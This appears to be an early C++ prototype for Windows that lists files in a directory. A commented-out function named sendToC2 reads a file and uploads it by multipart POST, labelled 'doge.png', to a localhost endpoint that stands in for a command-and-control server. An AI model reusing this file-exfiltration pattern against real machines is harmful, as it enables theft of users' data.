#include <windows.h>
#include <winhttp.h>
#include <string>
#include <fstream>
#include <iostream>
//#include "libcurl/curl.h"
#include <vector>
#include <filesystem>


using namespace std;

vector<string> getFileNamesFromPath(string location) {
	vector<string> paths;
	for (const auto& entry : std::filesystem::directory_iterator(location))
		paths.push_back(entry.path().string());
	return paths;
}
/*

//https://stackoverflow.com/questions/38320819/c-curl-send-mulipart-form-data-file-to-webserver
void sendToC2(string path) {
	std::string contents;
	std::ifstream in(path, std::ios::in | std::ios::binary);
	if (in)
	{
		in.seekg(0, std::ios::end);
		contents.resize(in.tellg());
		in.seekg(0, std::ios::beg);
		in.read(&contents[0], contents.size());
		in.close();
	}
	CURL* curl;
	CURLcode res;
	struct curl_httppost* formpost = NULL;
	struct curl_httppost* lastptr = NULL;
	curl_global_init(CURL_GLOBAL_ALL);
	curl_formadd(&formpost,
		&lastptr,
		CURLFORM_COPYNAME, "content-type:",
		CURLFORM_COPYCONTENTS, "multipart/form-data",
		CURLFORM_END);
	curl_formadd(&formpost, &lastptr,
		CURLFORM_COPYNAME, "file",
		CURLFORM_BUFFER, "doge.png",
		CURLFORM_BUFFERPTR, contents.data(),
		CURLFORM_BUFFERLENGTH, contents.size(),
		CURLFORM_END);
	curl = curl_easy_init();
	if (curl){
		curl_easy_setopt(curl, CURLOPT_URL, "http://127.0.0.1:5000/response_test");
		curl_easy_setopt(curl, CURLOPT_HTTPPOST, formpost);
		res = curl_easy_perform(curl);
		if (res != CURLE_OK)
			fprintf(stderr, "curl_easy_perform() failed: %s\n",
				curl_easy_strerror(res));
		curl_easy_cleanup(curl);
		curl_formfree(formpost);
	}
}

int main(int argc, char* argv[]) {
	for (auto s : getFileNamesFromPath("C:\\Users\\53444\\source\\repos\\post")) {
		cout << s << endl;
	}
	string path = "C:\\Users\\53444\\source\\repos\\post\\doge.png";
}

*/

